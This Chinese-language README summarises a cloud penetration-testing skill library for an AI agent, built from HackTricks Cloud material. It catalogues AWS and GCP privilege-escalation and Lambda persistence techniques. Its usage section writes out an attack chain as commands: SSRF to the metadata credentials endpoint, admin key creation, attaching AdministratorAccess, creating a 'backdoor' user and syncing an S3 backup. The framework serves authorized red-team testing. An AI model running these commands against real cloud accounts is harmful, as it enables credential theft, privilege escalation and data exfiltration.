# 云安全渗透测试框架 - 技能文件完成总结

## 📊 完成统计

### 已完成技能文件 (6个)

#### AWS 技能 (5个)

1. **skills/aws-iam-privesc.md** - AWS IAM 权限提升
   - 15+ 种权限提升技术
   - 完整攻击流程示例
   - 防御措施和检测方法
   - 参考 HackTricks Cloud

2. **skills/aws-metadata-ssrf.md** - AWS 元数据服务 SSRF 利用
   - IMDSv1 和 IMDSv2 利用
   - SSRF 场景和绕过方法
   - 跨账户攻击
   - 实战案例

3. **skills/aws-s3-pentesting.md** - AWS S3 存储桶渗透测试
   - 存储桶枚举和猜测
   - 权限检查和数据下载
   - 后门植入和敏感文件搜索
   - S3 网站利用

4. **skills/aws-lambda-privesc.md** - AWS Lambda 权限提升
   - 9 种权限提升技术
   - 代码注入和环境变量 RCE
   - 层利用和凭证外带
   - 完整攻击决策树

5. **skills/aws-lambda-persistence.md** - AWS Lambda 持久化
   - 8 种持久化技术
   - 层后门、扩展后门
   - 版本后门和自循环后门
   - 技术对比表

#### GCP 技能 (1个)

6. **skills/gcp-iam-privesc.md** - GCP IAM 权限提升
   - 10 种权限提升技术
   - 服务账号利用
   - 令牌伪造和签名
   - 完整攻击流程

### 待处理技能文件 (167+)

从 HackTricks Cloud 仓库中发现 173 个 README 文件，已处理 6 个。

---

## 📁 技能文件结构

每个技能文件包含以下部分：

```yaml
---
# 前置元数据
name: 技能名称
description: 技能描述
category: 类别
platform: 平台
technique_type: 技术类型
triggers:
  - 触发词列表
---

# 技能内容

## 触发条件
- 用户请求场景

## 前置条件
- 必需工具
- 必需权限

## 攻击技术
- 技术清单（包含命令和代码示例）

## 完整攻击流程
- 步骤化攻击示例

## 防御措施
- 检测方法
- 防御建议

## 参考资源
- HackTricks Cloud 链接
- 官方文档
```

---

## 🎯 技能选择系统

### agent.md 管理系统

`agent.md` 文件提供：

1. **技能清单** - 所有可用技能的完整列表
2. **决策树** - 根据用户输入自动选择合适的技能
3. **使用流程** - 标准化的技能激活和执行流程
4. **技能组合** - 多技能组合使用的示例
5. **开发计划** - 4 阶段开发路线图

### 决策树示例

```
用户请求 "AWS Lambda 权限提升"
         ↓
识别关键词: "AWS", "Lambda", "privesc"
         ↓
匹配技能: aws-lambda-privesc.md
         ↓
加载技能内容
         ↓
枚举权限 → 选择攻击方法 → 执行攻击 → 验证结果
```

---

## 🔥 核心技术亮点

### AWS IAM 权限提升 (30+ 技术)

- `iam:CreateAccessKey` - 为管理员创建密钥
- `iam:CreateLoginProfile` - 设置控制台密码
- `iam:AttachUserPolicy` - 附加管理员策略
- `iam:PutUserPolicy` - 创建内联策略
- `iam:AddUserToGroup` - 加入管理员组
- `iam:UpdateAssumeRolePolicy` - 修改角色信任策略
- `iam:PassRole` + `ec2:RunInstances` - 启动高权限 EC2
- `iam:CreatePolicyVersion` - 创建新策略版本
- `iam:SetDefaultPolicyVersion` - 切换策略版本
- `iam:CreateVirtualMFADevice` - 创建虚拟 MFA 设备
- ... 更多技术

### AWS Lambda 技术集合

**权限提升 (9种)**:
- iam:PassRole + lambda:CreateFunction
- lambda:UpdateFunctionCode
- lambda:UpdateFunctionConfiguration (环境变量 RCE)
- lambda:AddPermission
- lambda:CreateEventSourceMapping
- 层注入
- 凭证外带
- 函数 URL 利用
- 扩展利用

**持久化 (8种)**:
- Lambda 层后门
- Lambda 扩展后门
- 版本后门 + API Gateway
- 异步自循环后门
- Cron/Event 触发后门
- 别名和权重后门
- Execution Wrapper 后门
- 运行时固定后门

### GCP IAM 权限提升 (10+ 技术)

- `iam.roles.update` - 修改角色权限
- `iam.roles.create` - 创建自定义角色
- `iam.serviceAccounts.getAccessToken` - 获取访问令牌
- `iam.serviceAccountKeys.create` - 创建服务账号密钥
- `iam.serviceAccounts.implicitDelegation` - 隐式委托
- `iam.serviceAccounts.signBlob` - 签名任意数据
- `iam.serviceAccounts.signJwt` - 签名 JWT
- `iam.serviceAccounts.setIamPolicy` - 修改服务账号策略
- `iam.serviceAccounts.actAs` - 通过 GCP 服务使用
- `iam.serviceAccounts.getOpenIdToken` - 生成 OIDC 令牌

---

## 📚 数据来源

### HackTricks Cloud 仓库

- **仓库**: https://github.com/HackTricks-wiki/hacktricks-cloud
- **文件总数**: 173 个 README 文件
- **已克隆到**: `/tmp/hacktricks-cloud`
- **内容分类**:
  - AWS 安全 (权限提升、持久化、后渗透利用)
  - Azure 安全
  - GCP 安全
  - IBM Cloud 安全
  - CI/CD 安全

---

## 🚀 使用指南

### 1. 技能激活

当用户提出请求时：

```python
# 伪代码
if "AWS IAM 权限提升" in user_input:
    skill = load_skill("aws-iam-privesc.md")
    return skill

if "Lambda 持久化" in user_input:
    skill = load_skill("aws-lambda-persistence.md")
    return skill
```

### 2. 技能执行

```bash
# 示例：使用 AWS IAM 权限提升技能

# 步骤 1: 枚举权限
./enumerate-iam.py --access-key AKIA... --secret-key ...

# 步骤 2: 发现有 iam:CreateAccessKey

# 步骤 3: 执行攻击
aws iam create-access-key --user-name admin-user

# 步骤 4: 验证结果
aws sts get-caller-identity --profile stolen-admin

# 步骤 5: 建立持久化
aws iam create-user --user-name backdoor
```

### 3. 技能组合

多个技能可以组合使用：

```bash
# 场景：SSRF → 元数据服务 → IAM 权限提升 → S3 数据下载

# 步骤 1: 利用 SSRF (aws-metadata-ssrf.md)
curl http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 步骤 2: 获取临时凭证
aws configure set profile stolen --access-key ASIA... --secret-key ...

# 步骤 3: IAM 权限提升 (aws-iam-privesc.md)
aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 步骤 4: S3 数据下载 (aws-s3-pentesting.md)
aws s3 sync s3://company-backup ./downloaded
```

---

## 🛠️ 开发工具

### 批量转换脚本

- `/tmp/batch_convert.sh` - 自动化转换脚本框架
- `/tmp/convert_hacktricks.py` - Python 转换脚本
- 支持从 HackTricks 格式转换为技能文件格式

### 文件结构

```
/private/tmp/cloud-pentest-framework/
├── agent.md                          # Agent 管理系统
├── CLAUDE.md                         # 项目说明
├── skills/                           # 技能文件目录
│   ├── aws-iam-privesc.md
│   ├── aws-metadata-ssrf.md
│   ├── aws-s3-pentesting.md
│   ├── aws-lambda-privesc.md
│   ├── aws-lambda-persistence.md
│   └── gcp-iam-privesc.md
├── exploits/                         # 利用脚本
│   └── aws-iam-privilege-escalation.md
└── README-SKILLS.md                  # 本文件
```

---

## 📖 参考资源

### 核心资源

- HackTricks Cloud: https://cloud.hacktricks.wiki/
- HackTricks Cloud GitHub: https://github.com/HackTricks-wiki/hacktricks-cloud
- Rhino Security Labs: https://rhinosecuritylabs.com/
- NetSPI: https://www.netspi.com/

### 平台文档

- AWS IAM: https://docs.aws.amazon.com/IAM/
- GCP IAM: https://cloud.google.com/iam/docs
- Azure AD: https://docs.microsoft.com/en-us/azure/active-directory/

### 工具

- enumerate-iam: https://github.com/andresriancho/enumerate-iam
- Pacu: https://github.com/RhinoSecurityLabs/pacu
- Scout Suite: https://github.com/nccgroup/ScoutSuite

---

## 🎓 学习路径

### 初级

1. 理解云平台基础架构
2. 学习 IAM/RBAC 权限模型
3. 掌握基础 CLI 工具使用

### 中级

1. 学习权限提升技术
2. 掌握元数据服务利用
3. 理解存储安全

### 高级

1. 掌握攻击链组合
2. 学习横向移动技术
3. 实施持久化后门

### 专家

1. 开发自定义攻击脚本
2. 研究新的利用技术
3. 集成到红队框架

---

## 🔮 未来规划

### Phase 1: AWS 核心 (进行中)

- [ ] EC2 权限提升
- [ ] CloudFormation 权限提升
- [ ] KMS 权限提升
- [ ] Secrets Manager 权限提升
- [ ] DynamoDB 权限提升

### Phase 2: AWS 深度

- [ ] Lambda 后渗透利用
- [ ] EC2/EBS/SSM/VPC 后渗透利用
- [ ] CloudFormation 持久化
- [ ] IAM 持久化

### Phase 3: 多云平台

- [ ] Azure AD 权限提升
- [ ] Azure 元数据服务利用
- [ ] GCP 元数据服务利用
- [ ] GCP GCS 存储渗透
- [ ] GCP Cloud Functions 渗透

### Phase 4: 国内云平台

- [ ] 阿里云 RAM 权限提升
- [ ] 阿里云 OSS 渗透
- [ ] 腾讯云 CAM 权限提升
- [ ] 腾讯云 COS 渗透
- [ ] 华为云 IAM 权限提升

---

## 📝 注意事项

### 法律合规

- ✅ 必须获得书面测试授权
- ✅ 必须定义测试范围
- ✅ 必须遵守法律法规

### 技术限制

- ⚠️ MFA 可能阻止某些攻击
- ⚠️ 条件访问可能限制登录
- ⚠️ 所有 API 调用都会被记录
- ⚠️ 异常访问模式会触发告警

### 安全建议

- 🔒 使用测试账号而非生产账号
- 🔒 不要在客户数据上测试
- 🔒 记录所有测试活动
- 🔒 测试后清理测试资源

---

## 📞 支持和反馈

如需帮助或发现技能文件错误，请：

1. 检查 agent.md 中的技能清单
2. 查看相关技能文件的参考链接
3. 提交 Issue 或 PR 到项目仓库

---

**当前版本**: v1.0.0
**最后更新**: 2025-03-18
**技能文件总数**: 6 / 173 (3.5% 完成)
**状态**: 🚧 开发中
